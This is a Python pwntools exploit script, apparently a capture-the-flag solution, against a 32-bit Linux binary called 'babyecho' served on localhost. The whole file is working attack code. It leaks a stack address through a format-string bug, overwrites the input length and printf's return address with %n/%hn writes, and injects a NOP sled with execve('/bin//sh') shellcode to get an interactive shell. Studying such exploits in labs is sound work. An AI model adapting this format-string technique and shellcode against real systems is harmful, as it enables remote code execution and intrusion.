#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./babyecho"

rhp = {'host':"localhost",'port':12300}
context(os='linux',arch='i386')
binf = ELF(FILENAME)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"


def send_by_nbyte(conn,payload,n):
  while len(payload)>=(n-1):
    conn.sendline(payload[:(n-1)])
    print(conn.recvuntil("bytes\n"))
    if len(payload)==(n-1):
      return
    payload = payload[n-1:]
  
  if len(payload)!=0:
    conn.sendline(payload)

def exploit(conn):
  conn.recvuntil("bytes\n")

  #leak stack addr
  conn.sendline("%5$p")
  stack_addr = int(conn.recvline()[2:],16) #addr buffer
  print("stack_addr: "+hex(stack_addr))

  #overwrite input size into 99
  send_by_nbyte(conn,p32(stack_addr - 4*3) + "%" + str(99 - 0x4)  + "c" + "%7$n",13)

  #generate craft which overwrite RA of printf into stack_addr and inject NOP thread and shellcode
  print("stack_addr + 0x50: "+hex(stack_addr+0x50))
  print("***"+hex(int(hex(stack_addr+0x50)[-4:],16)))
  print("***"+hex(stack_addr+0x50)[-8:-4])
  payload = p32(stack_addr - 4*8) + p32(stack_addr - 4*8 + 2)  +  "%" + str(int(hex(stack_addr+0x40)[-4:],16) - 0x8) + "c" + "%7$hn"
  payload += "%" + str(int(hex(stack_addr+0x40)[-8:-4],16) - int(hex(stack_addr+0x40)[-4:],16)) + "c" + "%8$hn"
  payload += p8(0x90)*40
  print("payload length(without shellcode"+hex(len(payload)))
  payload += shellcode
  print("payload length: "+hex(len(payload)))

  #run
  send_by_nbyte(conn,payload,99)

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
      b *0x8048f3c
      b *0x8048ff7
      b *0x804900f
      c
    """
    conn = gdb.debug(FILENAME,cmd)
else:
    conn = remote(rhp['host'],rhp['port'])
exploit(conn)
conn.interactive()

